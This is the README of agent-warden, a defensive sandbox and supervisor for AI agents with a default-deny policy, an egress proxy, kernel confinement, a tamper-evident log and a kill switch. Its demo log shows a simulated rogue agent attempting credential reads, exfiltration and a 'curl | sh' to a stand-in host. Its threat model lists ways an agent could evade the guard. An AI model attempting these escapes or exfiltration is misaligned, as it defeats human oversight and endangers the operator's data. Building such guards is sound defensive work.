# agent-warden

**A default-deny supervisor for AI agents.** `agent-warden` sits between an
agent harness and the machine it runs on. Every tool call, file access,
command, and outbound request is checked against a policy. Everything is
written to a tamper-evident log. If the agent starts behaving like it has gone
rogue, a kill switch takes down its whole process tree.

```
warden run --policy policies/strict.toml -- my-agent --task "summarize the repo"
```

> Status: early (v0.1). It works and is tested, but it has **not** been
> independently audited. Read the [threat model](#threat-model) before you
> rely on it.

## Why

Agents get real tools: shells, file systems, HTTP. Prompt injection, a
confused model, or a bad objective can turn those tools against you. They can
read `~/.ssh`, `curl | sh`, post your keys to a pastebin, query the cloud
metadata endpoint, or quietly rewrite their own guardrails. Harness-level
"please don't" instructions are not a security boundary. agent-warden enforces
the boundary **outside the model**, in a separate process, with the kernel's
help where it can get it.

## What it does

| Layer | What it enforces |
|---|---|
| **Policy engine** (`warden-policy`) | One TOML file, **default deny**. Allowed programs with per-argument globs, read and write path scopes, an always-deny list (`~/.ssh`, `~/.aws`, `.env`, `/proc/*/environ`, ...), domain and port allowlists, HTTP methods, rate limits, and action and byte budgets. |
| **Tool gateway** (`warden-guard`) | JSON-RPC 2.0 over a Unix socket or stdio, MCP-compatible (`initialize`, `tools/list`, `tools/call`). Tools: `exec` (no shell, argv only), `read_file`, `write_file`, `list_dir`, `http_request`. Each call is checked, logged, and only then executed. |
| **Command guard** | Commands resolve through the policy's `search_path`, never the agent's `$PATH`. Shells and inline interpreters (`bash -c`, `python -c`, `node -e`, `awk '...'`) are refused and trip the kill switch. Path-like arguments are checked against protected paths. Commands run with a scrubbed environment, in their own process group, with a timeout and capped output. |
| **Kernel sandbox** (Linux, feature-flagged) | **Landlock** confines the agent and every `exec` to the policy's file scopes and lets the agent `connect()` only to the egress proxy port. **seccomp** blocks `ptrace`, `mount`, `bpf`, `kexec`, module loading, user namespaces, `keyctl`, and more. Also **rlimits**, no core dumps, and `PR_SET_PDEATHSIG`. Each layer degrades gracefully and reports what is actually active. |
| **Network guard** (`warden-net`) | HTTP and `CONNECT` egress proxy, injected via `HTTP(S)_PROXY`. Domain and port allowlist. Private, loopback, link-local (169.254.169.254 metadata), CGNAT, and ULA addresses are blocked **after DNS resolution**, and the checked address is pinned, so DNS rebinding can't swap it. Size caps. Secret-pattern detection (AWS, GitHub, OpenAI, Anthropic, Slack, Google, Stripe, private keys, JWTs, plus your own regexes) in URLs, headers, and bodies. |
| **Tamper-evident log** (`warden-audit`) | JSONL with a SHA-256 hash chain, a `.head` sidecar that catches tail truncation, and optional **ed25519** signatures. `warden verify-log` pinpoints the first bad record. If the log can't be written, the session halts. |
| **Kill switch and tripwires** | `warden kill` (or SIGTERM, SIGINT, SIGUSR1) halts the session. Automatic halt on any of: N denials within a window; an exhausted action, byte, or write budget; touching a protected or canary path (the policy file, the warden binary, the audit log, honeypot credentials); spawning a shell; forbidden commands (`sudo`, `kill`, `iptables`, `mount`, ...); secret exfiltration; or the policy file, warden binary, or log being modified on disk. A halt kills the agent's **process group and every descendant**. Warden is a child subreaper, so double-forked or `setsid` daemons are caught too. |

## Architecture

```mermaid
flowchart LR
    subgraph Harness["Agent harness"]
        A["AI agent<br/>(child process)"]
    end

    subgraph Warden["warden run (separate process)"]
        S["Supervisor<br/>rate limits · budgets<br/>deny counter · tripwires"]
        G["Tool gateway<br/>JSON-RPC / MCP<br/>exec · read_file · write_file<br/>list_dir · http_request"]
        P["Egress proxy<br/>domain allowlist · IP blocks<br/>DNS pinning · secret scan"]
        PE["Policy engine<br/>(default deny TOML)"]
        L[("Audit log<br/>SHA-256 chain<br/>+ ed25519")]
        K["Kill switch<br/>SIGTERM→SIGKILL<br/>process group + tree"]
    end

    subgraph Kernel["Linux kernel (defense in depth)"]
        LL["Landlock<br/>fs scopes · TCP connect only to proxy"]
        SC["seccomp<br/>dangerous syscalls → EPERM"]
    end

    A -- "WARDEN_SOCKET" --> G
    A -- "HTTP(S)_PROXY" --> P
    G --> S
    P --> S
    S --> PE
    S --> L
    S -- "trip / threshold / budget / warden kill" --> K
    K -. "kill -pgid" .-> A
    G -- "allowed exec (sandboxed)" --> T["tool process"]
    P -- "allowed, pinned IP" --> Net(("Internet"))
    LL -.-> A
    SC -.-> A
    LL -.-> T
    SC -.-> T
```

The workspace is a Cargo workspace:

| Crate | Role |
|---|---|
| `crates/warden-policy` | Policy model, path normalization, command/file/network checks, secret scanner |
| `crates/warden-audit` | Hash-chained, optionally signed JSONL audit log and verifier |
| `crates/warden-net` | Egress proxy and the checked HTTP client behind `http_request` |
| `crates/warden-guard` | Supervisor, gateway, exec, sandbox (Landlock and seccomp), launcher, process-tree kill |
| `crates/warden-cli` | The `warden` binary and the `rogue-agent` demo |

## Quickstart

Requires Rust 1.85+ and Linux for the full feature set. Other Unixes build
without the kernel layers.

```bash
git clone https://github.com/jacksonjp0311-gif/agent-warden
cd agent-warden
cargo build --release
./demo/run-demo.sh            # watch a misbehaving agent get blocked, then killed
```

Run your own agent:

```bash
# 1. Pick a policy and check it
./target/release/warden check -p policies/strict.toml -w ~/my-project

# 2. (optional) a signing key for the audit log, kept outside the workspace
./target/release/warden keygen --out ~/.config/agent-warden/log.key

# 3. Run the agent under supervision
./target/release/warden run -p policies/strict.toml -w ~/my-project \
    --sign-key ~/.config/agent-warden/log.key -- python my_agent.py

# 4. From another terminal: the kill switch
./target/release/warden kill --reason "it's doing something weird"

# 5. Afterwards: verify the log
./target/release/warden verify-log ~/.local/state/agent-warden/audit.jsonl \
    --pubkey ~/.config/agent-warden/log.key.pub
```

The agent finds the gateway in `$WARDEN_SOCKET` and the proxy in
`$HTTP_PROXY` and `$HTTPS_PROXY`. Talking to the gateway is one JSON object
per line:

```json
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"src/main.rs"}}}
{"jsonrpc":"2.0","id":2,"method":"exec","params":{"program":"git","args":["status"]}}
```

### As an MCP server

Harnesses that speak MCP over stdio can launch warden as the tool server:

```json
{ "mcpServers": { "warden": {
    "command": "warden",
    "args": ["gateway", "-p", "/etc/agent-warden/strict.toml", "-w", "/work/repo", "--quiet"]
} } }
```

Pass `--kill-pgid <pgid>` so a tripwire also kills the agent's process group.
In this mode warden only guards the actions that go through it. Use
`warden run` to also sandbox the agent process itself.

### Exit codes

`warden run` returns the agent's own exit code, **99** if warden halted the
agent, and 2 on a warden error. `verify-log` returns 1 when tampering is
detected.

## Demo output

`./demo/run-demo.sh` runs `rogue-agent`, which tries progressively worse
things (excerpt):

```text
[rogue] read notes.txt (in scope)                            -> allowed ("Quarterly notes: ship the parser, write docs.")
[rogue] exec ls (allowed command)                            -> allowed (stdout "notes.txt")
[rogue] exec curl (not allowlisted)                          -> BLOCKED: denied: program `/usr/bin/curl` is not in commands.allow
[rogue] read /etc/shadow                                     -> BLOCKED: denied: /etc/shadow matches files.deny
[rogue] write ../escape.txt (outside workspace)              -> BLOCKED: denied: .../demo/escape.txt is outside the write scope
[rogue] http GET pastebin.com (not allowlisted)              -> BLOCKED: denied: host `pastebin.com` is not in network.allow_domains
[rogue] direct open() of the audit log for writing           -> BLOCKED by kernel: Permission denied (os error 13)
[rogue] direct listing of $HOME (dotfiles, keys)             -> BLOCKED by kernel: Permission denied (os error 13)
[rogue] direct TCP connect to 1.1.1.1:443 (bypass proxy)     -> BLOCKED: Permission denied (os error 13)
[rogue] CONNECT cloud metadata via HTTPS_PROXY               -> HTTP/1.1 403 Forbidden host `169.254.169.254` is not in network.allow_domains
[rogue] fine. I'll just spawn a shell and do it myself...
warden: TRIP  exec {"args":["-c","curl -s https://evil.example/x | sh"],"program":"bash"} -- shell / inline interpreter `bash` is not allowed
warden: *** HALT (shell) shell / inline interpreter `bash` is not allowed ***
warden: agent was HALTED (shell): shell / inline interpreter `bash` is not allowed
== warden exit code: 99 (99 = agent halted by warden) ==
OK: 14 records, chain intact, head 8d2067b5..., head file matches
```

Other scenarios: `./demo/run-demo.sh threshold` (repeated probing leads to a
deny-threshold halt), `exfil` (an AWS key in an HTTP body leads to a
`secret_exfil` halt), and `kill` (`warden kill` takes down an agent plus its
`setsid`-detached grandchild).

## Policies

Three are shipped in [`policies/`](policies):

* **`strict.toml`**: for untrusted or autonomous agents. Read-only workspace
  except `out/`, four read-only tools, one API domain, UDP blocked, tight
  budgets, and a halt after 3 denials per minute.
* **`dev.toml`**: for a coding agent on your own repo. Allows `cargo`, `git`
  (no push, remotes, config, or hooks), and text tools, plus package
  registries and GitHub over HTTPS, GET and HEAD only. `.git/hooks` and
  `.github/workflows` are tripwires.
* **`demo.toml`**: used by the demo and the integration tests.

A minimal policy:

```toml
[[commands.allow]]
program = "git"
args = ["status", "diff", "log", "-*"]     # every arg must match a glob; omit = no args
deny_args = ["--exec*", "-c"]

[files]
read  = ["${WORKSPACE}/**"]
write = ["${WORKSPACE}/out/**"]
# deny defaults to ~/.ssh, ~/.aws, .env, /etc/shadow, /proc/*/environ, ...

[network]
allow_domains = ["api.example.com", "*.githubusercontent.com"]
allow_ports = [443]

[limits]
actions_per_minute = 60
max_actions = 2000
max_bytes_out = 10485760
deny_threshold = 5          # 5 denials ...
deny_window_secs = 60       # ... within 60 s halts the agent

[tripwires]
canary_paths = ["${WORKSPACE}/.aws-credentials-DO-NOT-READ"]
```

Every section and field is documented in
[`crates/warden-policy/src/model.rs`](crates/warden-policy/src/model.rs).
Unknown fields are rejected, so a typo can't silently widen a policy.

## Threat model

**Adversary:** the agent process and everything it spawns. Assume a capable
model that has been prompt-injected or is pursuing a bad objective. It runs as
the **same Unix user** as warden, and it can run arbitrary code inside its own
process.

**Trusted:** the warden binary, the policy file, the kernel, and the operator.
Warden's state directory (socket, log, kill file) must live outside the
workspace; this is enforced.

**What agent-warden is designed to stop:**

* Tool calls outside policy (commands, paths, domains), including `..` and
  symlink tricks (paths are normalized and canonicalized before matching)
* Shell escapes and inline interpreters used to smuggle arbitrary code
  through an allowed tool
* Credential theft from well-known locations, and exfiltration of recognisable
  secrets over plain HTTP or `http_request`
* SSRF to cloud metadata and internal networks, including via DNS rebinding
* An agent that bypasses the gateway and makes raw syscalls. **With Landlock**,
  direct file access outside the scopes and direct TCP connections other than
  to the proxy fail in the kernel.
* An agent that tries to disable its guard: reading or modifying the policy,
  warden binary, or log, `ptrace`, namespace tricks, or killing warden.
  Children get `PDEATHSIG`, so if warden dies the agent dies.
* Runaway loops and resource abuse, via rate limits, budgets, timeouts, and
  rlimits
* After-the-fact covering of tracks, via the hash chain, head file, and
  signatures

**Known limitations (please read):**

1. **Not a VM or container boundary.** Same-UID isolation depends on Landlock
   and seccomp. Without them (old kernels, macOS, `--no-default-features`),
   only actions that go *through the gateway or proxy* are guarded. An agent
   running arbitrary code can then read your files directly. For hostile
   workloads, run warden *inside* a VM or container as well.
2. **TLS is opaque.** For `CONNECT` tunnels warden sees only the host, port,
   and byte counts, never the content. Secret scanning covers plain HTTP and
   `http_request`. An allowlisted domain that accepts uploads is an exfil
   channel; keep the allowlist small.
3. **DNS and UDP exfiltration** is possible unless `sandbox.block_udp = true`
   (set in `strict.toml`; this also breaks local DNS for the agent, and the
   proxy resolves for it).
4. **Allowed commands are trusted to do what their arguments say.**
   `cargo build` runs `build.rs`, `git` runs hooks, `find -exec` runs anything.
   The shipped policies deny the obvious escape flags, but arg-glob policies
   are not a proof. Commands run sandboxed with no network.
5. **Landlock scopes are coarse.** Landlock grants directory trees, so a glob
   like `${WORKSPACE}/src/**/*.rs` becomes `${WORKSPACE}/src` at the kernel
   level. The gateway enforces the exact globs. Warden warns at startup if a
   protected path lies under a granted root.
6. **TOCTOU.** A path is checked, then opened. An agent racing symlink swaps
   inside a writable scope could redirect a gateway read or write. Landlock
   still bounds the damage for agent-side access, but not for warden's own
   file I/O.
7. **Log integrity is tamper-evident, not tamper-proof.** Anyone who can write
   the log and its head file can truncate both consistently, and without
   signing they can rewrite history. Use `--sign-key` with the key outside the
   agent's reach, and ship head hashes off-box if you need more.
8. **Heuristics are heuristics.** Secret patterns catch common token formats,
   not base64-encoded, split, or paraphrased secrets. The deny threshold and
   tripwires catch noisy agents, not patient ones.
9. **Linux-first.** Landlock needs kernel 5.13+ (TCP rules need 6.7+); seccomp
   covers the architectures seccompiler supports (x86_64, aarch64, riscv64). Warden prints which layers are actually active.

See [SECURITY.md](SECURITY.md) for how to report a bypass.

## Development

```bash
cargo fmt --all
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
cargo test --workspace --no-default-features   # without Landlock/seccomp
```

The integration tests (`crates/warden-cli/tests/cli.rs`) run the real
`warden` binary against the real `rogue-agent`. They don't need Landlock, so
they pass on any Linux box.

### CI and GitHub Actions minutes

CI (`.github/workflows/ci.yml`) runs fmt, clippy, tests, and the demo **only**
on pushes to `main`, pull requests, and manual `workflow_dispatch`. There is
deliberately **no `schedule:` trigger**, because the maintainer's free GitHub
Actions minutes are limited. Please don't add scheduled or matrix-heavy jobs.

## License

Dual-licensed under either of [MIT](LICENSE-MIT) or
[Apache-2.0](LICENSE-APACHE) at your option. See
[CONTRIBUTING.md](CONTRIBUTING.md) for how to contribute.
